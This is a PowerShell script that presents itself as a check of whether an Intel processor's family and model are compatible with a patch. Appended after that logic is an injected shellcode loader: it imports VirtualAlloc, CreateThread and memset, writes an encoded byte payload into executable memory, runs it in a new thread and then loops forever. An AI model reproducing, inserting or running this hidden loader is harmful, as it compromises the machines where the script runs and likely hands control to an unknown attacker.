﻿

[CmdletBinding()]
param ()

$Processor = [string]((Get-WmiObject win32_processor).Caption)
$Family = ($Processor.split(" ") | Where-Object { (($_ -notlike "*Intel*") -and ($_ -notlike "*x64*") -and ($_ -notlike "*Intel64*")) })[1]
$Model = ($Processor.split(" ") | Where-Object { (($_ -notlike "*Intel*") -and ($_ -notlike "x64")) })[3]
$Output = "Family: " + $Family
Write-Output -InputObject $Output
$Output = " Model: " + $Model
Write-Output -InputObject $Output
If ($Family -ge 6) {
	If ($Model -ge 42) {
		Write-Output -InputObject "Patch is compatible"
		Exit 0
	} else {
		Write-Output -InputObject "Patch in incompatible due to old model"
		Exit 1
	}
} else {
	Write-Output -InputObject "Patch in incompatible due to old family"
	Exit 1
}

$eMb6 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $eMb6 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xc3,0xd9,0x74,0x24,0xf4,0xb8,0xea,0xd3,0x3c,0x79,0x5a,0x31,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x42,0x14,0x03,0x42,0xfe,0x31,0xc9,0x85,0x16,0x37,0x32,0x76,0xe6,0x58,0xba,0x93,0xd7,0x58,0xd8,0xd0,0x47,0x69,0xaa,0xb5,0x6b,0x02,0xfe,0x2d,0xf8,0x66,0xd7,0x42,0x49,0xcc,0x01,0x6c,0x4a,0x7d,0x71,0xef,0xc8,0x7c,0xa6,0xcf,0xf1,0x4e,0xbb,0x0e,0x36,0xb2,0x36,0x42,0xef,0xb8,0xe5,0x73,0x84,0xf5,0x35,0xff,0xd6,0x18,0x3e,0x1c,0xae,0x1b,0x6f,0xb3,0xa5,0x45,0xaf,0x35,0x6a,0xfe,0xe6,0x2d,0x6f,0x3b,0xb0,0xc6,0x5b,0xb7,0x43,0x0f,0x92,0x38,0xef,0x6e,0x1b,0xcb,0xf1,0xb7,0x9b,0x34,0x84,0xc1,0xd8,0xc9,0x9f,0x15,0xa3,0x15,0x15,0x8e,0x03,0xdd,0x8d,0x6a,0xb2,0x32,0x4b,0xf8,0xb8,0xff,0x1f,0xa6,0xdc,0xfe,0xcc,0xdc,0xd8,0x8b,0xf2,0x32,0x69,0xcf,0xd0,0x96,0x32,0x8b,0x79,0x8e,0x9e,0x7a,0x85,0xd0,0x41,0x22,0x23,0x9a,0x6f,0x37,0x5e,0xc1,0xe7,0xf4,0x53,0xfa,0xf7,0x92,0xe4,0x89,0xc5,0x3d,0x5f,0x06,0x65,0xb5,0x79,0xd1,0x8a,0xec,0x3e,0x4d,0x75,0x0f,0x3f,0x47,0xb1,0x5b,0x6f,0xff,0x10,0xe4,0xe4,0xff,0x9d,0x31,0x90,0xfa,0x09,0x7a,0xcd,0x53,0x4b,0x12,0x0c,0x5c,0x4b,0xc8,0x99,0xba,0x1b,0x5e,0xca,0x12,0xdb,0x0e,0xaa,0xc2,0xb3,0x44,0x25,0x3c,0xa3,0x66,0xef,0x55,0x49,0x89,0x46,0x0d,0xe5,0x30,0xc3,0xc5,0x94,0xbd,0xd9,0xa3,0x96,0x36,0xee,0x54,0x58,0xbf,0x9b,0x46,0x0c,0x4f,0xd6,0x35,0x9a,0x50,0xcc,0x50,0x22,0xc5,0xeb,0xf2,0x75,0x71,0xf6,0x23,0xb1,0xde,0x09,0x06,0xca,0xd7,0x9f,0xe9,0xa4,0x17,0x70,0xea,0x34,0x4e,0x1a,0xea,0x5c,0x36,0x7e,0xb9,0x79,0x39,0xab,0xad,0xd2,0xac,0x54,0x84,0x87,0x67,0x3d,0x2a,0xfe,0x40,0xe2,0xd5,0xd5,0x50,0xde,0x03,0x13,0x27,0x0e,0x90;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$rbF=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($rbF.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$rbF,0,0,0);for (;;){Start-sleep 60};

